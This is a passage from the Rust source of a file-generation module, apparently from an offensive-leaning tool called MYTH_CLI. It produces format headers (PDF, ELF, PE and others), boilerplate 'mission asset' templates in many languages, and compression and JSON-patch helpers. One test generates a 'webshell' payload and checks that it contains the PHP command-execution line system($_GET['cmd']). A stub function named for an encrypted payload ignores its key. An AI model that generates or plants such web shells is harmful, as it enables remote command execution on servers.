    fn generate_binary_content(&self, format: &str, content: Option<&[u8]>) -> Vec<u8> {
        #[allow(unused_imports)]
        use rand::prelude::*;
        let mut rng = rand::rng();

        match format {
            "pdf" => {
                // Minimum valid PDF 1.4 header
                let mut data = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n".to_vec();
                if let Some(user_content) = content {
                    data.extend_from_slice(user_content);
                }
                data
            }
            "zip" => {
                // Minimum valid empty ZIP file structure (End of Central Directory Record)
                vec![
                    0x50, 0x4B, 0x05, 0x06, // EOCD signature
                    0x00, 0x00, 0x00, 0x00, // Number of this disk
                    0x00, 0x00, 0x00, 0x00, // Disk where central directory starts
                    0x00, 0x00, 0x00,
                    0x00, // Number of central directory records on this disk
                    0x00, 0x00, 0x00, 0x00, // Total number of central directory records
                    0x00, 0x00, 0x00, 0x00, // Size of central directory
                    0x00, 0x00, 0x00, 0x00, // Offset of start of central directory
                    0x00, 0x00, // ZIP file comment length
                ]
            }
            "tar" => {
                // Tar files consist of 512-byte blocks. An empty tar is 1024 bytes of zeros.
                vec![0u8; 1024]
            }
            "bin" | "dat" | "raw" => {
                if let Some(user_content) = content {
                    user_content.to_vec()
                } else {
                    (0..1024).map(|_| rng.random::<u8>()).collect()
                }
            }
            "sqlite" => {
                // First 100 bytes of a standard SQLite 3 database file (Industry Grade)
                let mut header = vec![0u8; 100];
                header[..16].copy_from_slice(b"SQLite format 3\0");
                header[16..18].copy_from_slice(&[4, 0]); // Page size 1024
                header[18..20].copy_from_slice(&[1, 1]); // File format read/write versions
                header[20] = 0; // Reserved space
                header[21] = 64; // Max payload fraction
                header[22] = 32; // Min payload fraction
                header[23] = 32; // Leaf payload fraction
                header
            }
            "pcap" | "pcapng" | "wireshark" => {
                // Valid PCAP Global Header
                vec![
                    0xD4, 0xC3, 0xB2, 0xA1, // Magic number (microsecond precision)
                    0x02, 0x00, // Major version 2
                    0x04, 0x00, // Minor version 4
                    0x00, 0x00, 0x00, 0x00, // GMT to local correction
                    0x00, 0x00, 0x00, 0x00, // Accuracy of timestamps
                    0xFF, 0xFF, 0x00, 0x00, // Max length of captured packets
                    0x01, 0x00, 0x00, 0x00, // Data link type (Ethernet)
                ]
            }
            "exe" | "dll" | "msi" => {
                // Standard MS-DOS MZ Header (Industry Grade stub)
                let mut data = vec![0u8; 64];
                data[0..2].copy_from_slice(b"MZ");
                data[60..64].copy_from_slice(&[0x40, 0x00, 0x00, 0x00]); // Offset to PE header
                data
            }
            "elf" | "so" | "ko" => {
                // Standard ELF 64-bit LSB Header
                let mut data = vec![0u8; 64];
                data[0..4].copy_from_slice(b"\x7FELF");
                data[4] = 2; // 64-bit
                data[5] = 1; // Little endian
                data[6] = 1; // ELF version 1
                data[7] = 0; // Target ABI (System V)
                data[16..18].copy_from_slice(&[2, 0]); // Type: Executable
                data[18..20].copy_from_slice(&[0x3E, 0x00]); // Machine: x86-64
                data
            }
            "docx" | "xlsx" | "ods" | "odt" => {
                // Standard ZIP-based Office Magic
                b"PK\x03\x04\x14\x00\x00\x00\x08\x00".to_vec()
            }
            "deb" => b"!<arch>\ndebian-binary   1332148414  0     0     100644  4         `\n2.0\n"
                .to_vec(),
            "rpm" => b"\xED\xAB\xEE\xDB\x03\x00\x00\x00\x00\x00\x00\x00".to_vec(),
            "img" | "iso" => {
                let mut data = vec![0u8; 32768]; // System Area
                data.extend_from_slice(b"\x01CD001\x01\x00"); // Primary Volume Descriptor
                data
            }
            _ => {
                if let Some(user_content) = content {
                    user_content.to_vec()
                } else {
                    Vec::new()
                }
            }
        }
    }

    fn generate_random_content(
        &self,
        format: &str,
        filename: &str,
        timestamp: &str,
        uuid: &str,
    ) -> Vec<u8> {
        let content = match format {
            "json" => json!({
                "meta": {
                    "version": "1.0.0",
                    "origin": "MYTH_CLI_Sovereign",
                    "mission_id": uuid,
                    "generated_at": timestamp
                },
                "data": {
                    "filename": filename,
                    "status": "operational",
                    "payload_hash": format_args!("{:x}", Sha256::digest(uuid.as_bytes())).to_string()
                }
            }).to_string(),
            "yaml" | "yml" => format!("meta:\n  version: 1.0.0\n  mission_id: {}\ngenerated:\n  filename: {}\n  timestamp: {}\n", uuid, filename, timestamp),
            "rs" => format!(
r#"//! Generated Rust mission asset.
//! ID: {uuid}

use std::error::Error;

/// Main entry point for the generated asset.
pub fn main() -> Result<(), Box<dyn Error>> {{
    println!("Mission asset {filename} initialized successfully.");
    Ok(())
}}
"#, uuid=uuid, filename=filename),
            "py" => format!(
r#""""
Generated Python mission asset: {filename}
ID: {uuid}
""""
import os
import sys

def run_operation():
    print(f"Asset {filename} is active.")

if __name__ == '__main__':
    run_operation()
"#, filename=filename, uuid=uuid),
            "go" => format!(
r#"package main

import (
	"fmt"
	"os"
)

// ID: {uuid}
func main() {{
	fmt.Printf("Asset {filename} operational\n")
}}
"#, uuid=uuid, filename=filename),
            "c" => format!(
r#"/* Generated Mission Asset
 * ID: {uuid}
 */
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {{
    printf("Asset {filename} ready.\n");
    return EXIT_SUCCESS;
}}
"#, uuid=uuid, filename=filename),
            "cpp" => format!(
r#"/* Generated Mission Asset
 * ID: {uuid}
 */
#include <iostream>
#include <string>

int main() {{
    std::cout << "Asset {filename} online." << std::endl;
    return 0;
}}
"#, uuid=uuid, filename=filename),
            "kt" => format!("// Generated Kotlin mission asset\nfun main() {{\n    println!(\"Asset: {}\")\n}}", filename),
            "swift" => format!("// Generated Swift mission asset\nprint(\"Asset: {}\")", filename),
            "rb" => format!("#!/usr/bin/env ruby\n# Generated Ruby asset\nputs \"Asset: {}\"", filename),
            "pl" => format!("#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nprint \"Asset: {}\\n\";", filename),
            "lua" => format!("-- Generated Lua asset\nprint(\"Asset: {}\")", filename),
            "hs" => format!("-- Generated Haskell asset\nmain :: IO ()\nmain = putStrLn \"Asset: {}\"", filename),
            "ex" => format!("defmodule MissionAsset do\n  def main do\n    IO.puts \"Asset: {}\"\n  end\nend", filename),
            "zig" => format!(
r#"const std = @import("std");

/// Generated Zig mission asset.
/// ID: {uuid}
pub fn main() !void {{
    const stdout = std::io::getStdOut().writer();
    try stdout.print("Asset {filename} operational\n", .{{}});
}}
"#, uuid=uuid, filename=filename),
            "nim" => format!("echo \"Asset: {}\"", filename),
            "asm" | "s" => format!(
r#"; Generated Assembly mission asset
; ID: {uuid}

section .data
    msg db "Asset: {filename}", 10
    len equ $ - msg

section .text
    global _start

_start:
    mov eax, 4      ; sys_write
    mov ebx, 1      ; stdout
    mov ecx, msg
    mov edx, len
    int 0x80

    mov eax, 1      ; sys_exit
    xor ebx, ebx
    int 0x80
"#, uuid=uuid, filename=filename),
            "yara" => format!(
r#"rule MissionAsset_{rule_id} {{
    meta:
        description = "Generated YARA rule for mission asset"
        mission_id = "{uuid}"
        generated = "{timestamp}"
    strings:
        $magic = "MYTH_CLI_SOVEREIGN"
        $integrity = "{hash}"
    condition:
        $magic or $integrity
}}
"#, rule_id=uuid.replace("-", "_"), uuid=uuid, timestamp=timestamp, hash=format_args!("{:x}", Sha256::digest(uuid.as_bytes()))),
            "dockerfile" => format!(
r#"# Generated Dockerfile
# ID: {uuid}
FROM scratch
LABEL maintainer="MYTH_CLI"
LABEL mission_id="{uuid}"
"#, uuid=uuid),
            "makefile" => format!(
r#"# Generated Makefile asset
# ID: {uuid}

.PHONY: all clean

all:
	@echo "Asset {filename} ready."

clean:
	@echo "Cleaning asset {filename}."
"#, uuid=uuid, filename=filename),
            "hcl" | "tf" => format!(
r#"# Generated Infrastructure Asset
# ID: {uuid}

resource "null_resource" "mission_asset" {{
  triggers = {{
    mission_id = "{uuid}"
    generated  = "{timestamp}"
  }}
}}
"#, uuid=uuid, timestamp=timestamp),
            "html" | "htm" => format!(
r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Asset: {filename}</title>
    <style>
        body {{ background: #0a0a0a; color: #00ff41; font-family: monospace; }}
    </style>
</head>
<body>
    <h1>Mission Asset Functional</h1>
    <p>ID: {uuid}</p>
    <pre>{timestamp}</pre>
</body>
</html>
"#, filename=filename, uuid=uuid, timestamp=timestamp),
            "md" => format!(
r#"# Mission Asset: {filename}

## Strategic Overview
- **Asset ID**: `{uuid}`
- **Generation Timestamp**: `{timestamp}`
- **Status**: `OPERATIONAL`

> [!IMPORTANT]
> This asset is a generated component of the MYTH_CLI sovereign infrastructure.
"#, filename=filename, uuid=uuid, timestamp=timestamp),
            "sql" => format!(
r#"-- Generated Mission Data
-- ID: {uuid}

CREATE TABLE IF NOT EXISTS assets (
    id UUID PRIMARY KEY,
    name TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO assets (id, name) VALUES ('{uuid}', '{filename}');
"#, uuid=uuid, filename=filename),
            _ => format!(
r#"MISSION ASSET REPORT
====================
FILENAME: {filename}
UUID:     {uuid}
TIMESTAMP: {timestamp}
STATUS:    OPERATIONAL
--------------------
"#, filename=filename, uuid=uuid, timestamp=timestamp),
        };
        content.into_bytes()
    }

    /// Generate a file with injected metadata.
    pub async fn generate_with_metadata(
        &self,
        path: &str,
        _format: &str,
        content: Option<&[u8]>,
        metadata: HashMap<String, String>,
    ) -> Result<FileMetadata, FileGenError> {
        let mut enhanced = BytesMut::new();
        let meta_str = format!("# Metadata: {:?}\n", metadata);
        enhanced.extend_from_slice(meta_str.as_bytes());

        if let Some(existing_content) = content {
            enhanced.extend_from_slice(existing_content);
        }

        self.generate_file(path, Some(&enhanced)).await
    }

    /// Generate a file with Zstd compression (Industry Grade density).
    pub async fn generate_compressed(
        &self,
        path: &str,
        content: Option<&[u8]>,
        level: i32,
    ) -> Result<FileMetadata, FileGenError> {
        let full_path = self.resolve_path(path)?;
        let path_with_ext = if full_path.extension().and_then(|e| e.to_str()) == Some("zst") {
            full_path
        } else {
            let ext = full_path
                .extension()
                .and_then(|e| e.to_str())
                .unwrap_or("txt");
            full_path.with_extension(format!("{}.zst", ext))
        };

        let raw_content = content.map(|c| c.to_vec()).unwrap_or_else(|| {
            // Technical Correction: Generate random content for base 'txt' then compress
            self.generate_random_content("txt", "compressed", "now", "uuid")
        });

        let compressed =
            tokio::task::spawn_blocking(move || zstd::encode_all(&raw_content[..], level))
                .await
                .map_err(|e| FileGenError::Io(format!("Runtime error: {}", e)))??;

        // Industry Grade: Use path string directly for resolve_path logic in generate_file
        let path_str = path_with_ext.to_string_lossy();
        self.generate_file(&path_str, Some(&compressed)).await
    }

    /// Patch a JSON file using RFC 6902 (Atomic structural updates).
    pub async fn patch_json(
        &self,
        path: &str,
        patch_json: serde_json::Value,
    ) -> Result<FileMetadata, FileGenError> {
        let full_path = self.resolve_path(path)?;
        let content = fs::read_to_string(&full_path).await?;
        let mut doc: serde_json::Value = serde_json::from_str(&content)
            .map_err(|e| FileGenError::Serialization(e.to_string()))?;

        let patch: json_patch::Patch = serde_json::from_value(patch_json)
            .map_err(|e| FileGenError::Serialization(e.to_string()))?;
        json_patch::patch(&mut doc, &patch)
            .map_err(|e| FileGenError::Serialization(e.to_string()))?;

        let patched_content = doc.to_string();
        self.generate_file(path, Some(patched_content.as_bytes()))
            .await
    }

    /// Read a file using Memory-Mapped I/O (Extreme speed for large assets).
    pub async fn read_mmap(&self, path: &str) -> Result<Bytes, FileGenError> {
        let full_path = self.resolve_path(path)?;

        tokio::task::spawn_blocking(move || {
            let mut file = std::fs::File::open(&full_path)?;
            let metadata = file.metadata()?;
            let len = metadata.len();

            // Limit mmap to reasonable sizes for memory safety
            if len > 10 * 1024 * 1024 {
                let mut buf = vec![0u8; 1024];
                use std::io::Read;
                file.read_exact(&mut buf)?;
                return Ok(Bytes::from(buf));
            }

            let mmap = unsafe { memmap2::Mmap::map(&file)? };
            Ok::<Bytes, FileGenError>(Bytes::copy_from_slice(&mmap))
        })
        .await
        .map_err(|e| FileGenError::Io(format!("Runtime error: {}", e)))?
    }

    /// Optimized zero-copy pattern check using mmap.
    pub fn contains_pattern_mmap(&self, path: &Path, pattern: &[u8]) -> Result<bool, FileGenError> {
        let file = std::fs::File::open(path)?;
        let mmap = unsafe { memmap2::Mmap::map(&file)? };
        Ok(mmap.windows(pattern.len()).any(|window| window == pattern))
    }

    pub async fn get_statistics(&self) -> HashMap<String, u64> {
        self.statistics
            .iter()
            .map(|r| (r.key().clone(), *r.value()))
            .collect()
    }
}

fn final_payload_with_nonce(
    nonce: &[u8; 12],
    content: &[u8],
    _key: &[u8; 32],
) -> Result<Vec<u8>, FileGenError> {
    let mut payload = Vec::with_capacity(12 + content.len());
    payload.extend_from_slice(nonce);
    payload.extend_from_slice(content);
    Ok(payload)
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[tokio::test]
    async fn test_secure_path_resolution() {
        let dir = tempdir().unwrap();
        let config = FileGenerationConfig::default();
        let gen = FileGenerator::new(dir.path().to_path_buf(), None, config);

        // Valid path
        assert!(gen.resolve_path("test.txt").is_ok());

        // Path traversal
        assert!(gen.resolve_path("../outside.txt").is_err());
    }

    #[tokio::test]
    async fn test_boilerplate_generation() {
        let dir = tempdir().unwrap();
        let config = FileGenerationConfig::default();
        let gen = FileGenerator::new(dir.path().to_path_buf(), None, config);

        let res = gen.generate_file("test.json", None).await;
        assert!(res.is_ok());

        let content = tokio::fs::read_to_string(dir.path().join("test.json"))
            .await
            .unwrap();
        assert!(content.contains("\"meta\""));
        assert!(content.contains("{")); // JSON wrapper
    }

    #[tokio::test]
    async fn test_payload_generation() {
        let dir = tempdir().unwrap();
        let config = FileGenerationConfig::default();
        let gen = FileGenerator::new(dir.path().to_path_buf(), None, config);

        let res = gen.generate_payload("shell.php", "webshell").await;
        assert!(res.is_ok());

        let content = tokio::fs::read_to_string(dir.path().join("shell.php"))
            .await
            .unwrap();
        assert!(content.contains("system($_GET['cmd'])"));
    }

    #[tokio::test]
    async fn test_hex_encoded_generation() {
        let dir = tempdir().unwrap();
        let generator = FileGenerator::new(
            dir.path().to_path_buf(),
            None,
            FileGenerationConfig::default(),
        );

        let path = "test.bin";
        let hex_content = b"hex:48656c6c6f"; // "Hello" in hex

        let meta = generator
            .generate_file(path, Some(hex_content))
            .await
            .unwrap();
        let content = std::fs::read(dir.path().join(path)).unwrap();

        assert_eq!(content, b"Hello");
        assert_eq!(meta.size, 5);
    }

    #[tokio::test]
    async fn test_exe_boilerplate_generation() {
        let dir = tempdir().unwrap();
        let generator = FileGenerator::new(
            dir.path().to_path_buf(),
            None,
            FileGenerationConfig::default(),
        );

        let path = "test.exe";
        let meta = generator.generate_file(path, None).await.unwrap();
        let content = std::fs::read(dir.path().join(path)).unwrap();

        assert!(content.starts_with(b"MZ"));
        assert!(meta.size >= 2);
    }

    #[tokio::test]
    async fn test_generation_performance() {
        let dir = tempdir().unwrap();
        let gen = FileGenerator::new(
            dir.path().to_path_buf(),
            None,
            FileGenerationConfig::default(),
        );
        let start = std::time::Instant::now();

        let file_count = 100;
        for i in 0..file_count {
            let path = format!("perf_{}.rs", i);
            gen.generate_file(&path, None).await.unwrap();
        }

        let elapsed = start.elapsed();
        let avg = elapsed.as_millis() as f64 / file_count as f64;

        println!(
            "Generated {} files in {:?}. Avg: {}ms/file",
            file_count, elapsed, avg
        );
        assert!(
            avg < 20.0,
            "Average generation time should be under 20ms (debug mode allows margin)"
        );
    }

    #[tokio::test]
    async fn test_large_file_stress() {
        let dir = tempdir().unwrap();
        let gen = FileGenerator::new(
            dir.path().to_path_buf(),
            None,
            FileGenerationConfig::default(),
        );

        // 4MB file (aligned for O_DIRECT)
        let size = 4 * 1024 * 1024;
        let content = vec![0u8; size];

        let path = "large_stress.bin";
        let meta = gen.generate_file(path, Some(&content)).await.unwrap();

        assert_eq!(meta.size, size as u64);
        assert!(dir.path().join(path).exists());
    }
}
